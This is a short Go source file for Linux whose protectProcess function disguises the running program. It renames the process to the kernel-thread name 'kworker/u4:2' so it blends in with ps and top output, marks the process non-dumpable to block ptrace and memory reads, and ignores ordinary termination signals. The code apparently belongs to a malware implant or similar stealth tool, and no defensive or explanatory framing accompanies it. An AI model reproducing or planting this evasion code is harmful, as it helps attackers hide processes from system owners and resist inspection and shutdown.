//go:build linux

package main

import (
	"log"
	"os/signal"
	"syscall"
	"unsafe"

	"golang.org/x/sys/unix"
)

// processAlias replaces the process comm visible in top/ps/htop.
const processAlias = "kworker/u4:2"

func protectProcess() error {
	// Rename /proc/self/comm — shows in ps and most process monitors
	name, err := syscall.BytePtrFromString(processAlias)
	if err == nil {
		if err := unix.Prctl(unix.PR_SET_NAME, uintptr(unsafe.Pointer(name)), 0, 0, 0); err != nil {
			log.Printf("[!] prctl PR_SET_NAME: %v", err)
		}
	}

	// Prevent non-root ptrace and /proc/PID/mem reads
	if err := unix.Prctl(unix.PR_SET_DUMPABLE, 0, 0, 0, 0); err != nil {
		log.Printf("[!] prctl PR_SET_DUMPABLE: %v", err)
	}

	// Ignore soft kill signals — SIGKILL (9) cannot be caught
	signal.Ignore(syscall.SIGTERM, syscall.SIGHUP, syscall.SIGUSR1, syscall.SIGUSR2)

	return nil
}
